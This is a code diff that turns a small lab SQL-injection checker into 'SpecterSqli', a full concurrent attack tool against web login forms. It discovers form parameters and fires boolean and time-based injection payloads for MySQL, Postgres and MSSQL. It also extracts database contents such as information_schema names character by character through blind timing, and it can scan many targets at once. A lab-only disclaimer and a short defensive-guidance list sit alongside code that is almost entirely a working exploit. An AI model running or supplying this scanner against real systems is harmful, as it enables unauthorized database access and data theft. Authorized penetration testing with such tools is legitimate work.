@@ -1,52 +1,60 @@
 #!/usr/bin/env python3
 """
-sqli_scanner.py
+SpecterSqli - concurrent SQLi scanner with parameter discovery, blind boolean extraction,
+HTML timing charts, JSON & cookie support, and comparison mode.
 
-Small SQLi scanner for lab use:
-- boolean SQLi checks
-- blind/time-based SQLi checks (MySQL/Postgres/MSSQL variants)
-- optional comparison between two target backends (vulnerable vs secure)
-- simple defensive detection guidance and log output
+Usage examples:
+    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php
+    python3 specter_sqli.py --targets-file endpoints.txt --concurrency 10 --workers 8
+    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --compare http://10.0.2.20:5000/login.php
+    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --json
+    python3 specter_sqli.py --target http://10.0.2.15:5000/login.php --blind-extract "information_schema.tables" --maxlen 20
 
-Usage:
-    python3 sqli_scanner.py                # interactive prompts
-    python3 sqli_scanner.py --host 10.0.2.15 --port 5000
-    python3 sqli_scanner.py --url http://10.0.2.15:5000/login.php
-    python3 sqli_scanner.py --url http://10.0.2.15:5000/login.php --compare http://10.0.2.20:5000/login.php
+Note:
+ - This tool is for authorized lab/testing only.
+ - Dependencies: requests, beautifulsoup4, matplotlib
+   Install: pip3 install requests beautifulsoup4 matplotlib
 """
 
 import argparse
+import concurrent.futures
 import json
+import os
+import re
 import sys
 import time
-import re
-from urllib.parse import urljoin
+import traceback
+import base64
+import io
+from urllib.parse import urlparse, urljoin, parse_qs
+
 import requests
-from requests.exceptions import RequestException, ConnectTimeout, ReadTimeout, ConnectionError
+from bs4 import BeautifulSoup
+import matplotlib.pyplot as plt
 
-DEFAULT_TIMEOUT = 6  # seconds
-SLEEP_SECONDS = 5    # how long the time-based payloads ask DB to sleep
-LOGFILE = "sqli_scan_results.json"
+# ---------- CONFIG ----------
+DEFAULT_TIMEOUT = 6
+DEFAULT_SLEEP = 4
+LOGFILE = "specter_results.json"
+HTML_REPORT = "specter_report.html"
+USER_AGENT = "SpecterSqli/1.0"
+# ---------- END CONFIG ----------
 
-# --- Payloads ---
+# Payloads
 BOOLEAN_PAYLOADS = [
-    {"desc": "Classic OR true", "username": "alice' OR '1'='1' -- -", "password": "x"},
-    {"desc": "Numeric OR true", "username": "alice' OR 1=1 -- -", "password": "x"},
-    {"desc": "Tautology double quote", "username": "\" OR \"\" = \"", "password": "x"},
+    ("Classic OR true", "alice' OR '1'='1' -- -"),
+    ("Numeric OR true", "alice' OR 1=1 -- -"),
+    ("Tautology double quote", "\" OR \"\" = \""),
 ]
 
-# time-based payload templates for different DBs. The scanner will try each.
 TIME_PAYLOADS = [
-    # MySQL: IF(condition, SLEEP(n), 0)
-    {"db": "mysql", "template": "alice' OR IF({COND}, SLEEP({N}), 0) -- -"},
-    # MySQL alternative
-    {"db": "mysql", "template": "alice' OR (SELECT IF(1={COND}, SLEEP({N}), 0)) -- -"},
-    # Postgres: CASE WHEN condition THEN pg_sleep(n) ELSE pg_sleep(0) END
-    {"db": "postgres", "template": "alice' OR (SELECT CASE WHEN {COND} THEN pg_sleep({N}) ELSE pg_sleep(0) END) -- -"},
-    # MSSQL: WAITFOR DELAY '0:00:N' (note string formatting)
-    {"db": "mssql", "template": "alice' OR (SELECT CASE WHEN {COND} THEN 1 ELSE 0 END); WAITFOR DELAY '0:00:{N}' -- -"},
-    # Generic boolean time using benchmark() (some MySQL installs)
-    {"db": "mysql-benchmark", "template": "alice' OR (SELECT benchmark({N}00000,MD5(1))) -- -"},
+    # MySQL
+    ("mysql", "alice' OR IF({COND}, SLEEP({N}), 0) -- -"),
+    ("mysql", "alice' OR (SELECT IF({COND}, SLEEP({N}), 0)) -- -"),
+    # Postgres
+    ("postgres", "alice' OR (SELECT CASE WHEN {COND} THEN pg_sleep({N}) ELSE pg_sleep(0) END) -- -"),
+    # MSSQL (WAITFOR DELAY) - may need quoting tweaks
+    ("mssql", "alice' ; IF ({COND}) WAITFOR DELAY '0:00:{N}' -- -"),
 ]
 
 SQL_ERROR_REGEXES = [
@@ -61,45 +69,15 @@ SQL_ERROR_REGEXES = [
     r"Unhandled Exception",
 ]
 
-# --- Helpers ---
-def build_url_from_host(host, port, path="/login.php"):
-    if host.startswith("http://") or host.startswith("https://"):
-        return host if path == "" else urljoin(host, path)
-    else:
-        return f"http://{host}:{port}{path}"
 
-def prompt_if_missing(args):
-    if not args.url:
-        host = args.host or input("Target host or IP (e.g. 10.0.2.15): ").strip()
-        port = args.port or input("Target port (e.g. 5000): ").strip()
-        try:
-            port = int(port)
-        except:
-            print("Invalid port; using 80")
-            port = 80
-        args.url = build_url_from_host(host, port, args.path)
-    return args
-
-def save_results(results):
-    with open(LOGFILE, "w") as f:
-        json.dump(results, f, indent=2)
-    print(f"[+] Results saved to {LOGFILE}")
-
-def baseline_request(session, url, timeout=DEFAULT_TIMEOUT):
-    """Fetch baseline page (no payload)"""
+# -------------- Helpers --------------
+def is_probably_json(text):
     try:
-        t0 = time.time()
-        r = session.post(url, data={"username": "normaluser", "password": "normalpass"}, timeout=timeout, allow_redirects=True)
-        dt = time.time() - t0
-        return {
-            "status": r.status_code,
-            "length": len(r.text),
-            "text_sample": r.text[:1000],
-            "time": dt,
-            "headers": dict(r.headers)
-        }
-    except Exception as e:
-        return {"error": str(e)}
+        json.loads(text)
+        return True
+    except Exception:
+        return False
+
 
 def contains_sql_error(text):
     if not text:
@@ -109,216 +87,494 @@ def contains_sql_error(text):
             return True
     return False
 
-# --- Tests ---
-def test_boolean_sqli(session, url, timeout=DEFAULT_TIMEOUT):
-    results = []
-    base = baseline_request(session, url, timeout)
-    if "error" in base:
-        return {"error": f"Baseline error: {base['error']}"}
-    for p in BOOLEAN_PAYLOADS:
-        try:
-            t0 = time.time()
-            r = session.post(url, data={"username": p["username"], "password": p["password"]}, timeout=timeout, allow_redirects=True)
-            dt = time.time() - t0
+
+def timestamp():
+    return time.strftime("%Y-%m-%d %H:%M:%S")
+
+
+# -------------- Network utils --------------
+def normal_post(session, url, data=None, json_body=None, headers=None, timeout=DEFAULT_TIMEOUT, allow_redirects=True):
+    kwargs = {"timeout": timeout, "allow_redirects": allow_redirects}
+    if headers:
+        kwargs["headers"] = headers
+    if json_body is not None:
+        return session.post(url, json=json_body, **kwargs)
+    else:
+        return session.post(url, data=data, **kwargs)
+
+
+def baseline_request(session, url, timeout=DEFAULT_TIMEOUT, json_mode=False):
+    try:
+        t0 = time.time()
+        if json_mode:
+            r = normal_post(session, url, json_body={"username": "normaluser", "password": "normalpass"}, timeout=timeout)
+        else:
+            r = normal_post(session, url, data={"username": "normaluser", "password": "normalpass"}, timeout=timeout)
+        dt = time.time() - t0
+        return {
+            "ok": True,
+            "status": r.status_code,
+            "length": len(r.text or ""),
+            "time": dt,
+            "sample": (r.text or "")[:200],
+            "headers": dict(r.headers),
+            "is_json": is_probably_json(r.text or "")
+        }
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
+
+
+# -------------- Parameter discovery (GET/POST) --------------
+def discover_params(session, url, timeout=DEFAULT_TIMEOUT):
+    """
+    - Fetch the page (GET)
+    - Parse forms and inputs
+    - Return list of candidate parameters for GET and POST
+    """
+    try:
+        r = session.get(url, timeout=timeout)
+    except Exception as e:
+        return {"error": str(e)}
+
+    forms = []
+    soup = BeautifulSoup(r.text or "", "html.parser")
+    for form in soup.find_all("form"):
+        form_action = form.get("action") or url
+        method = (form.get("method") or "get").lower()
+        inputs = {}
+        for inp in form.find_all(["input", "textarea", "select"]):
+            name = inp.get("name")
+            if not name:
+                continue
+            typ = inp.get("type") or inp.name
+            value = inp.get("value") or ""
+            inputs[name] = {"type": typ, "value": value}
+        forms.append({"action": urljoin(url, form_action), "method": method, "inputs": inputs})
+    # fallback: try to parse query string params in the URL
+    qparams = {}
+    parsed = urlparse(url)
+    if parsed.query:
+        qparams = parse_qs(parsed.query)
+    return {"forms": forms, "query_params": qparams, "page_sample": (r.text or "")[:500]}
+
+
+# -------------- Boolean tests --------------
+def run_boolean_tests(session, url, param_name_candidates, baseline, json_mode=False, timeout=DEFAULT_TIMEOUT):
+    """
+    For each candidate parameter name, test boolean payloads in POST and GET.
+    Return findings list.
+    """
+    findings = []
+    for pname in param_name_candidates:
+        for desc, payload in BOOLEAN_PAYLOADS:
+            # Build data either as form or JSON depending on json_mode
+            if json_mode:
+                data = {pname: payload, "password": "x"}
+                headers = {"Content-Type": "application/json"}
+                t0 = time.time()
+                try:
+                    r = normal_post(session, url, json_body=data, headers=headers, timeout=timeout)
+                    dt = time.time() - t0
+                except Exception as e:
+                    findings.append({"param": pname, "payload": payload, "method": "json", "error": str(e)})
+                    continue
+            else:
+                data = {pname: payload, "password": "x"}
+                t0 = time.time()
+                try:
+                    r = normal_post(session, url, data=data, timeout=timeout)
+                    dt = time.time() - t0
+                except Exception as e:
+                    findings.append({"param": pname, "payload": payload, "method": "form", "error": str(e)})
+                    continue
+
             body = r.text or ""
-            indicator = {
-                "desc": p["desc"],
-                "payload": p["username"],
+            likely = False
+            if contains_sql_error(body):
+                likely = True
+            # length/time heuristics
+            if baseline.get("length") is not None and abs(len(body) - baseline["length"]) > max(20, 0.05 * baseline["length"]):
+                likely = True
+            for kw in ("welcome", "dashboard", "logout", "profile", "admin"):
+                if kw in body.lower():
+                    likely = True
+            findings.append({
+                "param": pname,
+                "payload_desc": desc,
+                "payload": payload,
+                "method": "json" if json_mode else "form",
                 "status": r.status_code,
                 "length": len(body),
                 "time": dt,
-                "likely_success": False,
-                "sql_error_found": contains_sql_error(body)
-            }
-            # Heuristics: different response length or presence of keywords suggests success
-            if indicator["length"] != base["length"]:
-                # if length changes significantly, flag
-                if abs(indicator["length"] - base["length"]) > max(20, 0.05 * base["length"]):
-                    indicator["likely_success"] = True
-            # also keyword check
-            for kw in ("welcome", "dashboard", "logout", "profile", "admin"):
-                if kw in body.lower():
-                    indicator["likely_success"] = True
-            results.append(indicator)
-        except ConnectTimeout:
-            results.append({"desc": p["desc"], "error": "connect timeout"})
-        except ReadTimeout:
-            results.append({"desc": p["desc"], "error": "read timeout"})
-        except RequestException as e:
-            results.append({"desc": p["desc"], "error": str(e)})
-    return {"baseline": base, "tests": results}
+                "likely_success": likely,
+                "sql_error": contains_sql_error(body)
+            })
+    return findings
 
-def test_time_sqli(session, url, timeout=DEFAULT_TIMEOUT, sleep_seconds=SLEEP_SECONDS):
+
+# -------------- Time-based / Blind tests --------------
+def run_time_tests(session, url, param_name_candidates, baseline, sleep_seconds=DEFAULT_SLEEP, json_mode=False, timeout=DEFAULT_TIMEOUT):
     """
-    For each time-based payload template, test:
-      - baseline response time
-      - payload with condition TRUE (should delay)
-      - payload with condition FALSE (should not delay)
+    For each candidate parameter and each template, run a true/false time-based test.
     """
-    result = {"baseline": None, "tests": []}
-    base = baseline_request(session, url, timeout)
-    if "error" in base:
-        return {"error": f"Baseline error: {base['error']}"}
-    result["baseline"] = base
-    for tpl in TIME_PAYLOADS:
-        db = tpl["db"]
-        templ = tpl["template"]
-        testspec = {"db": db, "template": templ, "attempts": []}
-        # Create two payloads: TRUE and FALSE conditions. We use simple 1=1 and 1=0 placeholders.
-        for cond_val, cond_desc in [("1=1", "true"), ("1=0", "false")]:
-            payload_username = templ.format(COND=cond_val, N=sleep_seconds)
+    results = []
+    for pname in param_name_candidates:
+        for db, templ in TIME_PAYLOADS:
+            try:
+                # true payload
+                payload_true = templ.format(COND="1=1", N=sleep_seconds)
+                payload_false = templ.format(COND="1=0", N=sleep_seconds)
+            except Exception:
+                continue
+
+            # Construct bodies
+            if json_mode:
+                body_true = {pname: payload_true, "password": "x"}
+                body_false = {pname: payload_false, "password": "x"}
+                headers = {"Content-Type": "application/json"}
+            else:
+                body_true = {pname: payload_true, "password": "x"}
+                body_false = {pname: payload_false, "password": "x"}
+                headers = None
+
+            # send false (quick) then true (delayed)
             try:
                 t0 = time.time()
-                r = session.post(url, data={"username": payload_username, "password": "x"}, timeout=timeout + sleep_seconds + 2, allow_redirects=True)
-                dt = time.time() - t0
-                testspec["attempts"].append({
-                    "cond": cond_desc,
-                    "payload": payload_username if len(payload_username) < 500 else payload_username[:500] + "...",
-                    "status": r.status_code,
-                    "time": dt,
-                    "length": len(r.text),
-                    "sql_error_found": contains_sql_error(r.text)
-                })
-            except ConnectTimeout:
-                testspec["attempts"].append({"cond": cond_desc, "error": "connect timeout"})
-            except ReadTimeout:
-                testspec["attempts"].append({"cond": cond_desc, "error": "read timeout"})
-            except RequestException as e:
-                testspec["attempts"].append({"cond": cond_desc, "error": str(e)})
-        # Interpret: if true-cond time is significantly larger than false-cond and baseline, it's likely vulnerable
-        try:
-            true_time = next(a["time"] for a in testspec["attempts"] if a.get("cond") == "true")
-            false_time = next(a["time"] for a in testspec["attempts"] if a.get("cond") == "false")
-            baseline_time = base["time"]
-            testspec["likely_time_sqli"] = (true_time - false_time) > (sleep_seconds * 0.6)
-            testspec["details"] = {
-                "true_time": true_time,
-                "false_time": false_time,
-                "baseline_time": baseline_time
-            }
-        except StopIteration:
-            testspec["likely_time_sqli"] = False
-            testspec["details"] = {}
-        result["tests"].append(testspec)
-    return result
+                if json_mode:
+                    r_false = normal_post(session, url, json_body=body_false, headers=headers, timeout=timeout)
+                else:
+                    r_false = normal_post(session, url, data=body_false, timeout=timeout)
+                tf = time.time() - t0
+            except Exception as e:
+                results.append({"param": pname, "db": db, "error": f"false-request failed: {e}"})
+                continue
 
-# --- Comparison between two URLs ---
-def compare_targets(url_a, url_b, timeout=DEFAULT_TIMEOUT):
-    """Run a subset of tests against both targets and compare outputs."""
+            try:
+                t0 = time.time()
+                # Increase timeout to allow sleep
+                if json_mode:
+                    r_true = normal_post(session, url, json_body=body_true, headers=headers, timeout=timeout + sleep_seconds + 2)
+                else:
+                    r_true = normal_post(session, url, data=body_true, timeout=timeout + sleep_seconds + 2)
+                tt = time.time() - t0
+            except Exception as e:
+                results.append({"param": pname, "db": db, "error": f"true-request failed: {e}"})
+                continue
+
+            likely = (tt - tf) > (sleep_seconds * 0.6)
+            results.append({
+                "param": pname,
+                "db": db,
+                "true_time": tt,
+                "false_time": tf,
+                "baseline_time": baseline.get("time"),
+                "likely_time_sqli": likely,
+                "payload_true": payload_true[:500],
+                "payload_false": payload_false[:500]
+            })
+    return results
+
+
+# -------------- Blind boolean extraction (per-character) --------------
+def blind_extract(session, url, param, condition_template, charset=None, maxlen=32, sleep_seconds=1, json_mode=False, timeout=DEFAULT_TIMEOUT):
+    """
+    Basic blind boolean extraction for lab use.
+    - condition_template should be something like: "SUBSTRING((SELECT database()),{pos},1)='{ch}'"
+      but we will accept a template using {pos} and {char} placeholders.
+    Example template (MySQL): "ASCII(SUBSTRING((SELECT database()),{pos},1))={ascii}"
+    Or boolean form: "SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),{pos},1)='{char}'"
+    WARNING: This is slow. Use only in lab environments.
+    """
+    if charset is None:
+        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@{}-.:/"
+
+    found = ""
+    for pos in range(1, maxlen + 1):
+        matched_char = None
+        for ch in charset:
+            # Build condition replacing placeholders {pos} and {char}
+            cond = condition_template.format(pos=pos, char=ch, ascii=ord(ch))
+            # Build payload that makes condition true cause a delay OR true response difference
+            # Prefer time-based template: using MySQL IF => SLEEP
+            payload = f"alice' OR IF({cond}, SLEEP({sleep_seconds}), 0) -- -"
+            if json_mode:
+                body = {param: payload, "password": "x"}
+                headers = {"Content-Type": "application/json"}
+                t0 = time.time()
+                try:
+                    r = normal_post(session, url, json_body=body, headers=headers, timeout=timeout + sleep_seconds + 2)
+                    dt = time.time() - t0
+                except Exception as e:
+                    return {"error": f"request error pos={pos} char={ch}: {e}", "found": found}
+            else:
+                body = {param: payload, "password": "x"}
+                t0 = time.time()
+                try:
+                    r = normal_post(session, url, data=body, timeout=timeout + sleep_seconds + 2)
+                    dt = time.time() - t0
+                except Exception as e:
+                    return {"error": f"request error pos={pos} char={ch}: {e}", "found": found}
+
+            # If it's delayed (approx) we assume the char matched
+            if dt > (sleep_seconds * 0.6):
+                matched_char = ch
+                found += ch
+                print(f"[+] pos {pos} -> '{ch}' (dt={dt:.2f}s)")
+                break
+        if not matched_char:
+            # No char matched => stop
+            print(f"[-] No match at position {pos}; stopping.")
+            break
+    return {"extracted": found}
+
+
+# -------------- HTML Report (with charts) --------------
+def make_timing_chart_png(timings, title="Response times"):
+    """
+    timings: list of dicts with keys 'label' and 'time'
+    Returns PNG bytes (base64-able)
+    """
+    labels = [t["label"] for t in timings]
+    times = [t["time"] for t in timings]
+    plt.figure(figsize=(max(6, len(labels) * 0.6), 4))
+    plt.title(title)
+    plt.xlabel("Test")
+    plt.ylabel("Seconds")
+    plt.grid(True, linestyle="--", linewidth=0.5)
+    plt.plot(labels, times, marker="o")
+    buf = io.BytesIO()
+    plt.tight_layout()
+    plt.savefig(buf, format="png")
+    plt.close()
+    buf.seek(0)
+    return buf.read()
+
+
+def build_html_report(results, outfile=HTML_REPORT):
+    """Create a simple HTML file summarizing results and embedding timing charts."""
+    header = f"<h1>SpecterSqli report</h1><p>Generated: {timestamp()}</p>"
+    sections = [header]
+
+    # Boolean findings
+    if results.get("boolean_findings"):
+        sections.append("<h2>Boolean findings</h2><ul>")
+        for f in results["boolean_findings"]:
+            sections.append("<li><pre>" + json.dumps(f, indent=2) + "</pre></li>")
+        sections.append("</ul>")
+
+    # Time tests
+    if results.get("time_findings"):
+        sections.append("<h2>Time-based findings</h2><ul>")
+        for t in results["time_findings"]:
+            sections.append("<li><pre>" + json.dumps(t, indent=2) + "</pre></li>")
+        sections.append("</ul>")
+
+        # Build a simple chart for true vs false times if available
+        timings = []
+        for idx, t in enumerate(results["time_findings"]):
+            label = f"{t.get('param')}|{t.get('db')}"
+            # choose the true_time if present else baseline time
+            ct = t.get("true_time") or t.get("baseline_time") or 0
+            timings.append({"label": label, "time": ct})
+        if timings:
+            png = make_timing_chart_png(timings, title="True-time per test (s)")
+            b64 = base64.b64encode(png).decode("ascii")
+            sections.append("<h3>Timing chart (true-time)</h3>")
+            sections.append(f'<img src="data:image/png;base64,{b64}" alt="timing chart" />')
+
+    # Blind extraction
+    if results.get("blind"):
+        sections.append("<h2>Blind extraction</h2><pre>" + json.dumps(results["blind"], indent=2) + "</pre>")
+
+    # Defensive guidance
+    sections.append("<h2>Defensive guidance</h2><ul>")
+    for s in (
+        "Use parameterized queries / prepared statements.",
+        "Do not reveal DB errors in responses; sanitize/monitor logs.",
+        "Consider WAF rules for known tautologies and time-based probes.",
+        "Rate-limit POST requests and suspicious traffic patterns.",
+        "Log suspicious payloads with source IP and timestamps (redact PII)."
+    ):
+        sections.append("<li>" + s + "</li>")
+    sections.append("</ul>")
+
+    html = "<html><body>" + "\n".join(sections) + "</body></html>"
+    with open(outfile, "w") as f:
+        f.write(html)
+    return outfile
+
+
+# -------------- Orchestration per-target --------------
+def analyze_target(url, opts):
+    """
+    Run discovery, baseline, boolean, time tests on a single target.
+    Returns a dict with all collected data.
+    """
     session = requests.Session()
-    session.headers.update({"User-Agent": "SQLi-Scanner/1.0"})
-    # run boolean and time tests for each
-    print(f"[+] Gathering results for A: {url_a}")
-    a_bool = test_boolean_sqli(session, url_a, timeout)
-    a_time = test_time_sqli(session, url_a, timeout)
-    print(f"[+] Gathering results for B: {url_b}")
-    b_bool = test_boolean_sqli(session, url_b, timeout)
-    b_time = test_time_sqli(session, url_b, timeout)
-    return {"A": {"url": url_a, "boolean": a_bool, "time": a_time},
-            "B": {"url": url_b, "boolean": b_bool, "time": b_time}}
+    session.headers.update({"User-Agent": USER_AGENT})
+    if opts.cookies:
+        # load cookies from a simple JSON file path provided (if exists)
+        if os.path.exists(opts.cookies):
+            try:
+                with open(opts.cookies, "r") as f:
+                    ck = json.load(f)
+                jar = requests.cookies.RequestsCookieJar()
+                for k, v in ck.items():
+                    jar.set(k, v)
+                session.cookies = jar
+                print("[*] Loaded cookies from", opts.cookies)
+            except Exception as e:
+                print("[!] Failed to load cookies:", e)
 
-# --- Defensive detection / report building ---
-def build_defensive_report(scan_results):
-    """
-    Create a simple defensive report:
-    - highlight suspicious responses and timings
-    - propose log detection regexes / alert rules
-    """
-    alerts = []
-    for t in scan_results.get("tests", []) if isinstance(scan_results, dict) else []:
-        pass  # placeholder - not used here
+    json_mode = opts.json or url.lower().endswith(".json") or False
 
-    # Generic guidance based on scan outcomes
-    guidance = {
-        "summary": "Automated defensive report (lab guidance). Review WAF and parameterized queries.",
-        "suggestions": [
-            "Use parameterized queries / prepared statements for all DB access.",
-            "Do not echo raw SQL errors to users. Mask database errors in production.",
-            "Implement Web Application Firewall (WAF) rules to block SQLi patterns, but don't rely solely on WAF.",
-            "Rate-limit login attempts and POST submission rates.",
-            "Enable application logging of suspicious inputs (store payload, source IP, timestamp) with redaction policy."
-        ],
-        "detection_rules": [
-            {
-                "name": "SQLi_error_signature",
-                "regex": r\"\"\"(?i)(?:SQL syntax|mysql_fetch|ORA-|syntax error at or near|PG::|SQLSTATE)\"\"\",
-                "description": "Log entries matching DB error text; trigger an alert for repeated occurrences."
-            },
-            {
-                "name": "Time_based_delay_detector",
-                "logic": "If the same source IP causes repeated requests where response_time > baseline + 4 seconds, flag as possible blind SQLi timing probe.",
-                "threshold_seconds": SLEEP_SECONDS * 0.6
-            },
-            {
-                "name": "Tautology_payload_detector",
-                "regex": r\"\"\"(?i)(\bor\b\s*1=1|\b' or '1'='1|\b\" or \"\" = \"\")\"\"\",
-                "description": "Detect common tautology payloads in POST parameters."
-            }
-        ]
-    }
-    return guidance
+    out = {"url": url, "discovery": None, "baseline": None, "boolean_findings": [], "time_findings": [], "blind": None}
 
-# --- CLI / Main ---
+    # Discover params
+    disc = discover_params(session, url, timeout=opts.timeout)
+    out["discovery"] = disc
+
+    # Candidate param names
+    candidates = set()
+    # common default candidates
+    for n in ("username", "user", "u", "email", "login", "password", "pass"):
+        candidates.add(n)
+    # add discovered form inputs
+    if isinstance(disc, dict) and disc.get("forms"):
+        for f in disc["forms"]:
+            for name in f["inputs"].keys():
+                candidates.add(name)
+    # query params
+    if isinstance(disc, dict) and disc.get("query_params"):
+        for name in disc["query_params"].keys():
+            candidates.add(name)
+
+    candidates = sorted(list(candidates))
+    out["candidates"] = candidates
+
+    # Baseline
+    base = baseline_request(session, url, timeout=opts.timeout, json_mode=json_mode)
+    out["baseline"] = base
+    if not base.get("ok", True):
+        return out
+
+    # Boolean tests
+    boolean = run_boolean_tests(session, url, candidates, base, json_mode=json_mode, timeout=opts.timeout)
+    out["boolean_findings"] = boolean
+
+    # Time tests
+    time_f = run_time_tests(session, url, candidates, base, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
+    out["time_findings"] = time_f
+
+    # Blind extraction (optional)
+    if opts.blind_extract:
+        # user supplies a condition template; we support a few helpers e.g. {pos} and {char}
+        cond_template = opts.condition_template or opts.blind_extract_condition or "ASCII(SUBSTRING(({expr}),{pos},1))={ascii}"
+        expr = opts.blind_extract  # user-supplied expression like "SELECT database()" or full subquery
+        # Replace placeholder {expr} in template if used
+        if "{expr}" in cond_template:
+            cond_template = cond_template.replace("{expr}", expr)
+        # We will call blind_extract with condition_template that uses {pos} and {char} or {ascii}
+        b = blind_extract(session, url, opts.blind_param or candidates[0], cond_template, charset=opts.charset, maxlen=opts.maxlen, sleep_seconds=opts.sleep, json_mode=json_mode, timeout=opts.timeout)
+        out["blind"] = b
+
+    return out
+
+
+# -------------- CLI --------------
+def parse_args():
+    p = argparse.ArgumentParser(prog="SpecterSqli", description="Concurrent SQLi scanner with discovery, timing, blind extraction, JSON & cookie support.")
+    p.add_argument("--target", help="Single target URL (e.g. http://10.0.2.15:5000/login.php)", default=None)
+    p.add_argument("--targets-file", help="File containing one target URL per line", default=None)
+    p.add_argument("--compare", help="Optional second target URL to compare against", default=None)
+    p.add_argument("--concurrency", help="Scan multiple endpoints concurrently from targets-file (toggle)", action="store_true")
+    p.add_argument("--workers", help="Max worker threads (default 6)", type=int, default=6)
+    p.add_argument("--timeout", help="Request timeout seconds", type=int, default=DEFAULT_TIMEOUT)
+    p.add_argument("--sleep", help="Seconds for time-based payloads", type=int, default=DEFAULT_SLEEP)
+    p.add_argument("--json", help="Treat endpoint as JSON API (send JSON bodies)", action="store_true")
+    p.add_argument("--cookies", help="Path to JSON file with cookies to load (key->value)", default=None)
+    p.add_argument("--blind-extract", help="Run blind-extract: provide SQL expression to extract (e.g. 'SELECT database()')", default=None)
+    p.add_argument("--blind-param", help="Parameter name to use for blind extraction (default: discovered candidate)", default=None)
+    p.add_argument("--condition-template", help="Condition template using {pos} {char} {ascii} or {expr}", default=None)
+    p.add_argument("--charset", help="Charset for blind extraction", default=None)
+    p.add_argument("--maxlen", help="Max length to extract in blind extraction", type=int, default=32)
+    p.add_argument("--output", help="JSON output filename", default=LOGFILE)
+    p.add_argument("--report", help="HTML report filename", default=HTML_REPORT)
+    p.add_argument("--quiet", help="Less console output", action="store_true")
+    return p.parse_args()
+
+
 def main():
-    parser = argparse.ArgumentParser(description="Lightweight SQLi scanner for lab/CTF use.")
-    parser.add_argument("--host", help="Target host (IP) without scheme, e.g. 10.0.2.15", default=None)
-    parser.add_argument("--port", help="Target port, e.g. 5000", type=int, default=None)
-    parser.add_argument("--url", help="Full URL to login endpoint (e.g. http://10.0.2.15:5000/login.php)", default=None)
-    parser.add_argument("--path", help="Path if using host+port, default /login.php", default="/login.php")
-    parser.add_argument("--compare", help="Optional second target URL to compare against (secure backend)", default=None)
-    parser.add_argument("--timeout", help="Request timeout seconds", type=int, default=DEFAULT_TIMEOUT)
-    parser.add_argument("--sleep", help="Seconds to use for time-based payloads", type=int, default=SLEEP_SECONDS)
-    args = parser.parse_args()
+    opts = parse_args()
 
-    args = prompt_if_missing(args)
-    target = args.url
-    compare_target = args.compare
+    targets = []
+    if opts.targets_file:
+        if not os.path.exists(opts.targets_file):
+            print("[!] targets file not found:", opts.targets_file)
+            sys.exit(1)
+        with open(opts.targets_file, "r") as f:
+            for line in f:
+                s = line.strip()
+                if s:
+                    targets.append(s)
+    if opts.target:
+        targets.append(opts.target)
 
-    print("[*] Target:", target)
-    if compare_target:
-        print("[*] Compare target:", compare_target)
+    if not targets:
+        print("[!] No targets specified. Use --target or --targets-file.")
+        sys.exit(1)
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": "SQLi-Scanner/1.0"})
+    # concurrency: if more than one target and --concurrency, use thread pool
+    results = []
+    start = time.time()
+    if opts.concurrency and len(targets) > 1:
+        print(f"[*] Running in concurrent mode with {opts.workers} workers on {len(targets)} targets")
+        with concurrent.futures.ThreadPoolExecutor(max_workers=opts.workers) as ex:
+            futs = {ex.submit(analyze_target, t, opts): t for t in targets}
+            for fut in concurrent.futures.as_completed(futs):
+                t = futs[fut]
+                try:
+                    res = fut.result()
+                except Exception as e:
+                    res = {"url": t, "error": str(e), "trace": traceback.format_exc()}
+                results.append(res)
+                if not opts.quiet:
+                    print(f"[+] Completed: {t}")
+    else:
+        for t in targets:
+            if not opts.quiet:
+                print(f"[*] Scanning: {t}")
+            res = analyze_target(t, opts)
+            results.append(res)
 
-    overall = {"target": target, "compare": compare_target, "boolean": None, "time": None, "comparison": None, "defensive": None}
-    try:
-        print("[*] Running boolean SQLi checks...")
-        overall["boolean"] = test_boolean_sqli(session, target, timeout=args.timeout)
-        print("[*] Running time-based SQLi checks...")
-        overall["time"] = test_time_sqli(session, target, timeout=args.timeout, sleep_seconds=args.sleep)
+    # If compare specified, run compare (both sequentially)
+    compare_results = None
+    if opts.compare:
+        if not opts.quiet:
+            print("[*] Running comparison with", opts.compare)
+        a = analyze_target(targets[0], opts)
+        b = analyze_target(opts.compare, opts)
+        compare_results = {"A": a, "B": b}
 
-        if compare_target:
-            overall["comparison"] = compare_targets(target, compare_target, timeout=args.timeout)
+    # Collate brief summary and save
+    out = {"generated": timestamp(), "targets": targets, "results": results, "compare": compare_results}
+    with open(opts.output, "w") as f:
+        json.dump(out, f, indent=2)
+    print(f"[+] Results saved to {opts.output}")
 
-        overall["defensive"] = build_defensive_report(overall)
+    # Build HTML report using the first target's consolidated findings
+    primary = results[0] if results else {}
+    html_in = {
+        "boolean_findings": primary.get("boolean_findings"),
+        "time_findings": primary.get("time_findings"),
+        "blind": primary.get("blind")
+    }
+    rpt = build_html_report(html_in, outfile=opts.report)
+    print(f"[+] HTML report written to {rpt}")
 
-        # Print brief summarized results
-        print("\n=== SUMMARY ===")
-        # boolean summary
-        if isinstance(overall["boolean"], dict) and "tests" in overall["boolean"]:
-            for t in overall["boolean"]["tests"]:
-                status = t.get("likely_success", False)
-                print(f" - BOOLEAN: {t['desc']:25} | likely_success={status} | length={t.get('length')} | status={t.get('status')}")
-        # time summary
-        if isinstance(overall["time"], dict) and "tests" in overall["time"]:
-            for t in overall["time"]["tests"]:
-                print(f" - TIME: {t['db']:10} | likely_time_sqli={t.get('likely_time_sqli')} | details={t.get('details')}")
+    elapsed = time.time() - start
+    print(f"[*] Done in {elapsed:.1f}s")
 
-        # Defensive guidance
-        print("\n=== DEFENSIVE GUIDANCE ===")
-        for s in overall["defensive"]["suggestions"]:
-            print(" -", s)
-
-        # Saving results
-        save_results(overall)
-
-    except KeyboardInterrupt:
-        print("\n[!] Interrupted by user")
-        save_results(overall)
-    except Exception as e:
-        print("[!] Unexpected error:", e)
-        save_results(overall)
 
 if __name__ == "__main__":
     main()
